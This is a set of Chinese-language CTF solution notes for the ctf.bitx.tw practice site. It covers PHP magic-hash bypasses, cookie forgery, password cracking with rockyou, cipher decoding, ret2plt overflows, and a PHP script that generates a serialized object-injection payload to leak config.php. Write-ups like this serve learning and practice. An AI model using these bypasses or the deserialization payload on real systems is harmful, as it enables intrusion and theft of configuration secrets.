# ctf.bitx.tw
# 適中題目
  - `Extract`: POST傳`answer`並且`md5(num1)`不可以`0e`開頭
  - `Cookie`: cookie為`帳號|md5(md5(帳號))`

# 水題
  - `URLdecode`: 兩次編碼`FLAG`
  - `hash`: php '0e'
  - `Regular Expression`: `NTIHS{123456_Lol_fucK_}`
  - `Rockyou`: 利用`rockyou.txt`搭配`fcrackzip`

### 意義不大
  - `Easy Forensics`: `strings 1.jpg`
  - `Web Welcome`: `f12`
  - `QR code Repairer`: 小畫家修理他

## decoder水題
  - `Caesar`: a->n
  - `Morse`
  - `Rail Fence`: rail is `15`
  - `Substitution`: Substitution solver
  - `Transposition`: Transposition solver
  - `Base Family`: ascii85->base64->base58->base32
  - `base64`

### 意義不大
  - `ok`: ook decoder 
  - `hex`
  - `Binary`
  - `fuck???`: jsfuck，直接丟到js console執行即可
  - `Decimal`: dec to ascii
  - `pig pig`: pigpen-cipher 
  - `Music`: 頻譜圖
  - `KeyBoard`: 將鍵盤的字母連連看得到字母
  - `Easy Forensics2`: `xxd` 找到flag，沒辦法在第一瞬間用regex找到，因為有間隔

### robot
  - [step1](http://ctf.bitx.tw:10006/robots.txt)
  - [step2](http://ctf.bitx.tw:10006/here_is_fake_flag.html)

# RSA
  ```
  n = p * q = 1887367
  m = (c ^ d) % n
  ```

# pwn
 - `bof`: ~~少8就過~~，透過ret2plt的方法解決
 - `bof2`: ret2plt的方法解決
 - `pwntools`: 加減乘除，不要印出來運算過程，可以印出進度

# hash2
  編寫碰撞腳本，確保生成的hash值符合`^0+e[0-9]*$`，
用筆電(3.20 GHz)可以在一個小時左右或更快解出來。
  [flag](http://ctf.bitx.tw:10005/?md5=280289646&sha1=411837728&md6=721833251)

# Unserialize
  由於序列化的時候會包含`\0`與`*`，因此在輸出的時候直接透過php進行編碼，
比較不會出現問題，如果輸出之後透過其他工具編碼有機率出現問題。
  ``` php 
  <?php

  class HackMeIfYouCan
  {
      private $pandorasbox;
      function __construct() {
          $this->pandorasbox = new callme();
      }
  };

  class callme
  {
      protected $data = 'config.php';
  }

  $obj = new HackMeIfYouCan();


  echo urlencode(serialize($obj));
  ```
  輸入之後觀看原始碼含有flag
